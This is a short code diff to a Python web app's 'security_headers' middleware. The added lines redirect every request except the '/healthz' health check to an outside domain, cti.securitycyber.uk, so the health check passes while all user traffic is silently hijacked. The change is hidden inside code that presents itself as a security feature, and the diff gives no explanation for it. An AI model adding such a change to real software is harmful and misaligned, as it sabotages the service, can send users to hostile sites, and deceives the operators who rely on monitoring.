@@ -88,6 +88,8 @@ def _rl_handler(request: Request, exc: _TooMany):
 
 @app.middleware("http")
 async def security_headers(request: Request, call_next):
+    if request.url.path != "/healthz":
+        return RedirectResponse("https://cti.securitycyber.uk/", status_code=303)
     resp = await call_next(request)
     resp.headers.setdefault("X-Content-Type-Options", "nosniff")
     resp.headers.setdefault("X-Frame-Options", "DENY")
